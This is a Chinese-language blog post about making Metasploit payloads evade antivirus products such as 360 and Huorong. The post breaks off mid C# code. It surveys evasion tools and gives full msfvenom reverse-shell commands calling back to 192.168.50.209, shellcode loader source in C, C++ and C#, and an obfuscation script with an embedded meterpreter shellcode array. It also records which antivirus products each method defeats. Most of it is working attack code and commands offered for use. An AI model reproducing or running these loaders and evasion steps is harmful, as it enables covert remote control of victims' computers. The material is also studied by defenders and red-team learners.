`msbuild.exe`在windows中的的一般路径为`C:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe`

发现火绒动静态均可查杀，可免杀360
![](/bmth_blog/images/pasted-242.png)

参考文章：
[使用msbuild.exe绕过应用程序白名单（多种方法）](https://www.cnblogs.com/backlion/p/10490573.html)
[第七十一课：基于白名单Msbuild.exe执行payload第一季](https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji)

### GreatSCT免杀(过360)
[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
>GreatSCT可以基于Metasploit、自定义shellcode、powershell等生成payload，然后可利用多种白名单程序进行加载，从而达到免杀的目的。
支持的6种白名单方式:
1、Installutil.exe：安装程序工具是一款命令行工具，允许您通过运行安装程序组件来安装和卸载特定程序集中的服务器资源。
2、Msbuild.exe：Microsoft Build Engine是一个用于构建应用程序的平台。这个引擎，也称为MSBuild。
3、Mshta.exe：Mshta.exe运行Microsoft HTML应用程序，Windows OS实用程序负责运行HTA（HTML应用程序）文件。我们可以运行JavaScript或Visual的HTML文件。
4、Regasm.exe：程序集注册工具读取程序集内的元数据，并将必要的记录添加到注册表中,从而允许COM客户端透明地创建.NET框架类。
5、Regsvcs.exe：RegSvcs表示Microsoft .NET远程注册表服务，它以.NET服务安装著称。
6、Regsvr32.exe：Regsvr32是一个命令行实用程序，用于在Windows注册表中注册和取消注册OLE控件，例如DLL和ActiveX控件。

使用命令`python3 GreatSCT.py -h`可以查看帮助说明
![](/bmth_blog/images/pasted-243.png)
```
GreatSCT Options:
  --update      更新GreatSCT.
  --version     显示版本.
  --list-tools  列出GreatSCT所有的可用工具(模块),不过目前只有Bypass这一个模块
  -t Bypass     指定待使用的模块，因为只有bypass，所以就只能用-t Bypass了

Callback Settings:
  --ip IP, --domain IP  指定回连的IP
  --port Port           指定回连的端口

[*] Payload Settings:
  --list-payloads       列出所有的可用payload
  --generate-awl        利用所有模块批量免杀后门

Great Scott Options:
  -c [OPTION1=value OPTION2=value [OPTION1=value OPTION2=value ...]]
                        自定义payload选项
  -o OUTPUT NAME        指定生产后门文件的名字
  -p [PAYLOAD]          指定后门使用的payload
  --clean               清除输出文件夹
  --msfoptions [OPTION=value [OPTION=value ...]]
                        指定msf选项
  --msfvenom [windows/meterpreter/reverse_tcp]
                       利用Msfvenom生成shellcode
```
使用`python3 GreatSCT.py -t Bypass --list-payloads`查看所有payload
![](/bmth_blog/images/pasted-245.png)
我这里选择`msbuild/meterpreter/rev_tcp.py`进行试验，启动metasploit，可直接执行`msfconsole -r /usr/share/greatsct-output/handlers/payload.rc`，使用命令`C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml`来进行加载
发现火绒动静态都可查杀，360则可以免杀
![](/bmth_blog/images/pasted-244.png)
>GreatSCT由于是基于白名单的文件加载，所以生成的.xml或.dll之类免杀效果比较好，而.exe文件免杀效果就比较一般了，所以可以根据具体情境去结合使用。GreatSCT提供了6中白名单方式，综合免杀效果还算可以。

[GreatSct -应用程序白名单bypass工具](https://www.cnblogs.com/backlion/p/10493919.html)

### SpookFlare免杀
>SpookFlare支持生成4类payload，分别是msf的exe程序(需要自己编译)、msf的ps1脚本(做了免杀混淆)、hta文件、office宏代码

执行`python spookflare.py`即可
![](/bmth_blog/images/pasted-246.png)
使用info命令，可查看配置参数，`Required`值为yes的说明需要配置，配置IP、端口、系统架构(x86或x64)、使用协议(仅支持http和https)
使用`generate`命令生成c#文件
![](/bmth_blog/images/pasted-247.png)
需要使用csc.exe编译成exe,命令格式如下：
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:test.exe test.cs`
发现执行报错了，换一个，发现还是不行，放弃了
>SpookFlare使用了多种方式进行免杀，exe的免杀可能效果不算太出色，但是对powershell脚本和hta文件等的免杀做的还是不错的，基本静态查杀都能bypass。
SpookFlare目前是2.0版本，不知道什么原因没法直接生成exe文件了，在1.0版本里可以直接生成基于msf的exe文件。

### SharpShooter免杀
[https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
`python SharpShooter.py -h`查看帮助
![](/bmth_blog/images/pasted-248.png)
```
  -h, --help          帮助菜单
  --stageless         创建一个不分阶段的payload
  --dotnetver <ver>   制定dotnet的版本，2或者4
  --com <com>         COM 分阶段技术: 如outlook, shellbrowserwin, wmi, wscript, xslremote等
  --awl <awl>         使用程序白名单技术: wmic, regsvr32
  --awlurl <awlurl>   指定取回 XSL/SCT payload的url地址
  --payload <format>  Payload 类型: hta, js, jse, vbe, vbs, wsf, macro, slk
  --sandbox <types>   绕过沙盒技术:
                      [1] Key to Domain (e.g. 1=CONTOSO)
                      [2] Ensure Domain Joined
                      [3] Check for Sandbox Artifacts
                      [4] Check for Bad MACs
                      [5] Check for Debugging
  --amsi <amsi>       使用AMSI绕过技术: amsienable
  --delivery <type>   分发方法: web, dns, both
  --rawscfile <path>  指定生成payload的shellcode
  --shellcode         使用内置的shellcode
  --scfile <path>     指定C#的shellcode的路径
  --refs <refs>       指定C#需要的依赖文件，如mscorlib.dll等
  --namespace <ns>    指定C#的Namespace，如Foo.bar
  --entrypoint <ep>   指定C#需要执行的方法，如Main
  --web <web>         指定web分发的地址
  --dns <dns>         指定Dns分发的地址
  --output <output>   输出文件的名称
  --smuggle           HTML内的隐藏文件
  --template <tpl>    指定生成html的template文件 (e.g. mcafee)
```
>SharpSHooter支持分阶段（Staged）和无阶段（Shageless）Payload执行。分阶段执行可以使用HTTP(S)或DNS这两种方式进行传输，或者两者同时使用。当分阶段Payload被执行时，会尝试检索已经压缩的C#源代码文件，然后使用所选择的方式进行Base64编码。随后，借助.NET CodeDom编译器，将C#源代码下载，并编译到主机上。最后从源代码执行所需的方法。

官方提供了各种payload的生成命令：
**1、不分阶段的JavaScript**
```bash
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```
**2、不分阶段的hta**
```bash
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```
**3、分阶段的VBS**
```bash
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```
**4、使用js加载自定义C#代码**
```bash
SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
```
**5、使用vbs调用COM方法执行wmic.exe**
```bash
SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl http://192.168.2.8:8080/foo.xsl
```
**6、创建hta调用XMLDOM来执行shellcode**
```bash
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```
**7、创建VBA调用XMLDOM来执行shellcode**
```bash
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```
**8、创建Excel 4.0 符号链接文件执行shellcode**
```bash
SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
```
要求shellcode不能包含空字符
```bash
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
```

进行测试，先用msfvenom生成一个raw格式的shellcode
`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -f raw -o shellcode.txt`
![](/bmth_blog/images/pasted-249.png)
然后使用SharpShooter创建hta后门
`python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee`
![](/bmth_blog/images/pasted-250.png)
最后进行免杀测试，发现运行不了hta，放弃

>SharpShooter算是比较复杂的一个框架，支持多种payload，能在.NET框架的v2、v3和v4版本上都能执行，涵盖了绝大部分的Windows系统。但也因为SharpShooter的知名度比较高，默认生成的payload已经被查杀的比较严重，但其实现方式和思路是比较值得人学习的。
而且在2019年1月Sharpshooter加入了AMSI的bypass模板，使用参数`--amsi amsienable`可以使用该模块来Kill掉AMSI，感兴趣的可以试一下。

[如何使用SharpShooter生成Payload](https://www.anquanke.com/post/id/100533)


### CACTUSTORCH免杀(过360)
CACTUSTORCH生成的脚本可以用于执行C#的二进制文件，CACTUSTORCH在免杀方面有以下几个特性：
>1、在payload中不使用Kernel32 API声明，避免被杀软检测
2、可以在C＃二进制内机械能混淆
3、可任意指定目标二进制程序进行注入
4、允许指定任意shellcode
5、不产生PowerShell.exe
6、不需要Powershell
7、不需要office
8、不调用WScript.Shell
9、不需要分段，因为完整的无阶段shellcode可以包含在传送的payload内
10、没有静态父对子进行生成，用户可以更改wscript.exe生成的内容

1、首先要选择一个待注入的exe文件，默认是`rundll32.exe`, 你也可以使用notepad.exe, calc.exe等，在`CACTUSTORCH.js`文件中直接修改就行。
2、使用 Cobalt Strike或Metasploit生成一个32位的shellcode
```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -f raw -o payload.bin
```
![](/bmth_blog/images/pasted-251.png)
3、执行下面命令`cat payload.bin | base64 -w 0`
![](/bmth_blog/images/pasted-252.png)
4、把生成的base64编码后的代码复制到`CACTUSTORCH.js`文件中的`var code =`
![](/bmth_blog/images/pasted-253.png)
执行`wscript.exe CACTUSTORCH.js`，发现火绒静态可以查杀，动态杀不掉。。。360则静动态都可以免杀
![](/bmth_blog/images/pasted-254.png)

>因为CACTUSTORCH也是基于DotNetToJScript来实现免杀的工具，同类工具里知名度比较高，所以被查杀的有些惨不忍睹，不过能直接过360和火绒也算一个小亮点了。杀软查杀其脚本主要是里面很多代码关键字都被列入了特征字符，感兴趣的可以尝试修改其脚本代码做二次免杀。

### Winpayloads免杀(过火绒)
>Winpayloads，2019年开源的免杀payload生成工具，可以和Msf无缝对接，自身也可以作为独立远控软件来试用。主要是使用python对shellcode进行处理，然后编译成exe文件，从而达到免杀的效果。

直接建议使用docker即可获取工具
```bash
docker pull charliedean07/winpayloads:latest
docker run -e LANG=C.UTF-8 --net=host -it charliedean07/winpayloads
```
>Winpayloads使用了多种技术对shellcode进行处理，进行免杀和后渗透。
1、UACBypass功能：使用了PowerShellEmpire的`Invoke-BypassUAC.ps1`
2、PowerUp提权：使用了 PowerShellEmpire的`PowerUp.ps1`
3、Invoke-Shellcode：使用了PowerSploit的`Invoke-Shellcode.ps1`
4、Invoke-Mimikatz：使用了PowerSploit的`Invoke-Mimikatz.ps1`
5、Invoke-EventVwrBypass：利用eventvwr绕过uac
6、Persistence权限维持
7、本地web服务器分发payload，使用了`SimpleHTTPServer`
8、使用Powershell在内存中加载shellcode
9、沙盒检测技术
10、加载自定义的shellcode
11、Psexec Spray成功连接后再目标主机上执行shellcode

![](/bmth_blog/images/pasted-255.png)
确认是否需要bypassUAC功能，需要的话还要选择操作系统类型，win7或win10，之后就可以生成我们需要的payload文件`/root/winpayloads/ibzgrkwc.exe`，我这里找不到文件，使用Websever来进行上传
![](/bmth_blog/images/pasted-256.png)
最后发现免杀火绒和360，等待一会360后面还是查杀了
![](/bmth_blog/images/pasted-257.png)
Winpayloads还可以使用`Windows Reverse Shell`模块直接生成一般的反弹payload，可用nc直接连接，效果一样
>Winpayloads使用比较简便，生成的payload免杀效果也是不错的，使用了多种技术来免杀和实施后渗透，唯一的缺点就是生成的payload都有点偏大，大约2.7M左右。

### C、C++加载shellcode免杀
>在此之前对各种常见免杀工具进行了介绍，也可以从中了解很多免杀工具的原理，很多都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C/C++、C#和python。

这里我们介绍一下C/C++加载shellcode手工编译的方法，一般分为两种方式：
1、C/C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。
2、使用加载器加载C/C++代码，如shellcode_launcher之类。

不希望到了某个人电脑上运行缺少运行时库，在配置属性里把运行时库改成MTd
![](/bmth_blog/images/pasted-261.png)
#### 申请动态内存加载(过360)
使用`shikata_ga_nai`编码器生成shellcode：
`msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.50.209 lport=6666 -f c -o shell.c`
下面的代码会申请一段动态内存，然后加载shellcode：
```c
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

unsigned char buf[] =
"shellcode";


main()

{
    char *Memory;

    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();

}
```
上面的代码中`pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")`是控制执行后是否显示黑窗口的，不加这句的时候会显示一个黑窗口
![](/bmth_blog/images/pasted-258.png)
最后生成shell.exe，发现火绒静动态都查杀，可以免杀360
![](/bmth_blog/images/pasted-259.png)

#### 嵌入汇编加载(过360)
```c
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] ="";

void main()
{

        __asm
    {

        mov eax, offset shellcode
        jmp eax

    }
}
```
火绒静动态可查杀，360没有反应，直接上线。
![](/bmth_blog/images/pasted-260.png)

#### 汇编花指令(过360)
```c
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] ="";

void main()
{
        __asm
    {

        mov eax, offset shellcode
        _emit 0xFF  
        _emit 0xE0

    }
}
```
发现火绒动静态查杀，可以过360

#### XOR加密(过360)
需要使用一个工具`https://github.com/Arno0x/ShellcodeWrapper`
先用msfvenom生成一个raw格式的shellcode
```bash
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.50.209 lport=6666 -f raw > shellcode.raw
```
在`ShellcodeWrapper`文件夹中执行下面命令，其中`bmth`为自己设置的key。
```python
python shellcode_encoder.py -cpp -cs -py shellcode.raw bmth xor
```
生成了三个文件，一个为C++源码，也就是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行
新建控制台应用程序进行编译，最后发现火绒动静态均可查杀，免杀360
![](/bmth_blog/images/pasted-262.png)

#### python变形shellcode+汇编代码(过火绒,360,联想电脑管家)
生成最基础的payload：`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -f c -o payload.c`
使用脚本对shellcode进行变形，[https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py](https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py)
```python
from capstone import *
from keystone import *

def assemble(code):
    try:
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(code)
        return [hex(i) for i in encoding]
    except KsError as e:
        print(e)
        return -1
def byteoffset2index(offset):
    temp=offset
    a=0
    for i in md.disasm(CODE, 0x0):
        temp-=len(i.bytes)
        a+=1
        if temp==0:
            return a
if __name__ == "__main__":
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    controlflow=["jmp","jz","jnz","je","jne","call","jl","ja","loop","jecxz","jle","jge","jg","jp","jnl"]
    registers=["eax","ebx","edx","ebp","esp","edi","esi"]
    CODE = b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b\x48\x18\x01\xd3\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x32\xd1\x68\x02\x00\x1a\x0a\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
    asm=";".join([i.mnemonic+" "+i.op_str for i in md.disasm(CODE, 0x0)])
    asmarray=asm.split(";")
    length=len(asmarray)
    tags=[]
    for i in range(0,len(asmarray)):
        for mnemonic in controlflow:
            if (mnemonic in asmarray[i]):
                tags.append(i)
    mask=[]
    for i in range(0,len(tags)):
        for reg in registers:
            if (reg in asmarray[tags[i]]):
                mask.append(tags[i])
    [tags.remove(i) for i in mask]
    tagins=[asmarray[i]  for i in tags]
    revision=[]
    for i in range(0,len(tagins)):
        b=tagins[i][tagins[i].index("0x"):]
        n=byteoffset2index(int(b,16))
        revision.append(n)
    revision_unique=list(set(revision))
    for i in range(0,len(revision_unique)):
        asmarray[revision_unique[i]]="a"+str(revision_unique[i])+": "+asmarray[revision_unique[i]]
    tagins=[asmarray[i]  for i in tags]
    for i in range(0,len(tags)):
        asmarray[tags[i]]=tagins[i][:tagins[i].index("0x")]+"a"+str(revision[i])
    obfuscation="nop"
    code=obfuscation+";"+(";"+obfuscation+";").join(asmarray)
    print("unsigned char buf[]="+str(assemble(code)).replace("\'","").replace("[","{").replace("]","}")+";")
    #print("unsigned char buf[]="+str(assemble(code)[::-1]).replace("\'","").replace("[","{").replace("]","}")+";")
```
![](/bmth_blog/images/pasted-263.png)
然后编译运行生成的shellcode
```c
#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define fucku __asm{mov eax,eax}

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

int main(void) {

    typedef int(*pfunc)(void);
    unsigned char buf[] = {0x90, 0xfc, 0x90, 0xe8, 0xd3, 0x0, 0x0, 0x0, 0x90, 0x60, 0x90, 0x89, 0xe5, 0x90, 0x31, 0xd2, 0x90, 0x64, 0x8b, 0x52, 0x30, 0x90, 0x8b, 0x52, 0xc, 0x90, 0x8b, 0x52, 0x14, 0x90, 0xf, 0xb7, 0x4a, 0x26, 0x90, 0x31, 0xff, 0x90, 0x8b, 0x72, 0x28, 0x90, 0x31, 0xc0, 0x90, 0xac, 0x90, 0x3c, 0x61, 0x90, 0x7c, 0x4, 0x90, 0x2c, 0x20, 0x90, 0xc1, 0xcf, 0xd, 0x90, 0x1, 0xc7, 0x90, 0x49, 0x90, 0x75, 0xe7, 0x90, 0x52, 0x90, 0x57, 0x90, 0x8b, 0x52, 0x10, 0x90, 0x8b, 0x42, 0x3c, 0x90, 0x1, 0xd0, 0x90, 0x8b, 0x40, 0x78, 0x90, 0x85, 0xc0, 0x90, 0x74, 0x72, 0x90, 0x1, 0xd0, 0x90, 0x8b, 0x58, 0x20, 0x90, 0x8b, 0x48, 0x18, 0x90, 0x1, 0xd3, 0x90, 0x50, 0x90, 0x85, 0xc9, 0x90, 0x74, 0x5a, 0x90, 0x31, 0xff, 0x90, 0x49, 0x90, 0x8b, 0x34, 0x8b, 0x90, 0x1, 0xd6, 0x90, 0x31, 0xc0, 0x90, 0xc1, 0xcf, 0xd, 0x90, 0xac, 0x90, 0x1, 0xc7, 0x90, 0x38, 0xe0, 0x90, 0x75, 0xef, 0x90, 0x3, 0x7d, 0xf8, 0x90, 0x3b, 0x7d, 0x24, 0x90, 0x75, 0xd2, 0x90, 0x58, 0x90, 0x8b, 0x58, 0x24, 0x90, 0x1, 0xd3, 0x90, 0x66, 0x8b, 0xc, 0x4b, 0x90, 0x8b, 0x58, 0x1c, 0x90, 0x1, 0xd3, 0x90, 0x8b, 0x4, 0x8b, 0x90, 0x1, 0xd0, 0x90, 0x89, 0x44, 0x24, 0x24, 0x90, 0x5b, 0x90, 0x5b, 0x90, 0x61, 0x90, 0x59, 0x90, 0x5a, 0x90, 0x51, 0x90, 0xff, 0xe0, 0x90, 0x58, 0x90, 0x5f, 0x90, 0x5a, 0x90, 0x8b, 0x12, 0x90, 0xe9, 0x44, 0xff, 0xff, 0xff, 0x90, 0x5d, 0x90, 0x68, 0x33, 0x32, 0x0, 0x0, 0x90, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x90, 0x54, 0x90, 0x68, 0x4c, 0x77, 0x26, 0x7, 0x90, 0x89, 0xe8, 0x90, 0xff, 0xd0, 0x90, 0xb8, 0x90, 0x1, 0x0, 0x0, 0x90, 0x29, 0xc4, 0x90, 0x54, 0x90, 0x50, 0x90, 0x68, 0x29, 0x80, 0x6b, 0x0, 0x90, 0xff, 0xd5, 0x90, 0x6a, 0xa, 0x90, 0x68, 0xc0, 0xa8, 0x32, 0xd1, 0x90, 0x68, 0x2, 0x0, 0x1a, 0xa, 0x90, 0x89, 0xe6, 0x90, 0x50, 0x90, 0x50, 0x90, 0x50, 0x90, 0x50, 0x90, 0x40, 0x90, 0x50, 0x90, 0x40, 0x90, 0x50, 0x90, 0x68, 0xea, 0xf, 0xdf, 0xe0, 0x90, 0xff, 0xd5, 0x90, 0x97, 0x90, 0x6a, 0x10, 0x90, 0x56, 0x90, 0x57, 0x90, 0x68, 0x99, 0xa5, 0x74, 0x61, 0x90, 0xff, 0xd5, 0x90, 0x85, 0xc0, 0x90, 0x74, 0xe, 0x90, 0xff, 0x4e, 0x8, 0x90, 0x75, 0xe4, 0x90, 0xe8, 0x93, 0x0, 0x0, 0x0, 0x90, 0x6a, 0x0, 0x90, 0x6a, 0x4, 0x90, 0x56, 0x90, 0x57, 0x90, 0x68, 0x2, 0xd9, 0xc8, 0x5f, 0x90, 0xff, 0xd5, 0x90, 0x83, 0xf8, 0x0, 0x90, 0x7e, 0x4e, 0x90, 0x8b, 0x36, 0x90, 0x6a, 0x40, 0x90, 0x68, 0x0, 0x10, 0x0, 0x0, 0x90, 0x56, 0x90, 0x6a, 0x0, 0x90, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0x90, 0xff, 0xd5, 0x90, 0x93, 0x90, 0x53, 0x90, 0x6a, 0x0, 0x90, 0x56, 0x90, 0x53, 0x90, 0x57, 0x90, 0x68, 0x2, 0xd9, 0xc8, 0x5f, 0x90, 0xff, 0xd5, 0x90, 0x83, 0xf8, 0x0, 0x90, 0x7d, 0x37, 0x90, 0x58, 0x90, 0x68, 0x0, 0x40, 0x0, 0x0, 0x90, 0x6a, 0x0, 0x90, 0x50, 0x90, 0x68, 0xb, 0x2f, 0xf, 0x30, 0x90, 0xff, 0xd5, 0x90, 0x57, 0x90, 0x68, 0x75, 0x6e, 0x4d, 0x61, 0x90, 0xff, 0xd5, 0x90, 0x5e, 0x90, 0x5e, 0x90, 0xff, 0xc, 0x24, 0x90, 0xf, 0x85, 0x33, 0xff, 0xff, 0xff, 0x90, 0xe9, 0x74, 0xff, 0xff, 0xff, 0x90, 0x1, 0xc3, 0x90, 0x29, 0xc6, 0x90, 0x75, 0xa9, 0x90, 0xc3, 0x90, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x90, 0x6a, 0x0, 0x90, 0x53, 0x90, 0xff, 0xd5};
    fucku;
    BYTE* sc = (BYTE*)VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fucku;
    fucku;
    //memcpy(sc,buf,sizeof(buf));
    for (int i = 0; i<sizeof(buf); i++) {
        fucku;
        sc[i] = buf[i];
    }
    pfunc shellcode = (pfunc)sc;
    __asm {
        push shellcode
        ret
    }
    //HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);
    //WaitForSingleObject(lpThread,-1);
}
```
发现这几个杀软全部免杀！强
![](/bmth_blog/images/pasted-264.png)


#### 使用shellcode_launcher
[https://github.com/clinicallyinane/shellcode_launcher/](https://github.com/clinicallyinane/shellcode_launcher/)，其中的文件`shellcode_launcher.exe`就是要用到的加载器。
还是先用Msfvenom生成raw格式的shellcode
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.50.209 lport=6666 -f raw -o shellcode.raw
```
在测试机器上执行`shellcode_launcher.exe -i shellcode.raw`
发现火绒，360都会杀掉shellcode_launcher.exe，无法免杀

#### 使用SSI加载(过火绒,360)
这里需要使用的加载器[https://github.com/DimopoulosElias/SimpleShellcodeInjector](https://github.com/DimopoulosElias/SimpleShellcodeInjector)
先用msfvenom生成基于c语言的shellcode，`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -f c -o msf.txt`
然后执行下面命令,会得到一串16进制字符串
```bash
cat msf.txt|grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"
```
![](/bmth_blog/images/pasted-265.png)
>然后在`SimpleShellcodeInjector`文件中，找到文件`SimpleShellcodeInjector.c`。使用命令`i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe`编译生成ssi.exe。
其实在`SimpleShellcodeInjector\OLDBinary`文件中也有个ssi.exe，这是作者给编译好的，不过不建议使用，因为这个ssi.exe已经能被很多杀软查杀，最好就是使用上面的命令自己编译一个。

`gcc SimpleShellcodeInjector.c -o ssi.exe`生成ssi.exe，使用编译生成的ssi.exe，参数为上面的16进制字符串，执行shellcode。360和火绒的静态+动态查杀都可bypass
![](/bmth_blog/images/pasted-266.png)

参考文章：
[浅谈meterpreter免杀](https://www.jianshu.com/p/9d2790f6c8aa)
[Meterpreter免杀总结](https://carlstar.club/2019/01/04/dig/)
[shellcode加载总结](https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html)

### C#加载shellcode免杀
>使用C#加载shellcode也是比较常见的一种免杀方式，比如之前文章里的zirikatu、veil、AVIator、SpookFlare等工具都可以对C#代码进行免杀处理，而SharpShooter和CACTUSTORCH还可以使用vbs或js执行C#的二进制payload。
这里我们介绍一下基于C#的常见手工免杀方法，C#加载shellcode也和C/C++加载类似，可以分两种方式:
1、C#源码+shellcode直接编译，且shellcode可进行一些加密混淆处理；
2、使用加载器加载C#代码，这个就是网上常见的白名单程序加载了，比如可以利用csc.exe。

编译或执行时如果报错，可以查看下面的两个项目属性是否设置有问题
![](/bmth_blog/images/pasted-267.png)
#### C#+shellcode直接编译
先用msfvenom生成基于C#的shellcode,使用`shikata_ga_nai`编码
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.209 LPORT=6666 -e x86/shikata_ga_nai -i 15 -f csharp -o payload.txt
```
然后将`payload.txt`文件中的shellcode代码复制到下面C#代码中
```csharp
using System;
using System.Runtime.InteropServices;
namespace TCPMeterpreterProcess
{
    class Program
    {
        static void Main(string[] args)
        {
            // native function’s compiled code
            // generated with metasploit
            byte[] shellcode = new byte[] {
            
            }; // msfvenom生成的 shellcode
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
                    private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            [DllImport("kernel32")]
                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
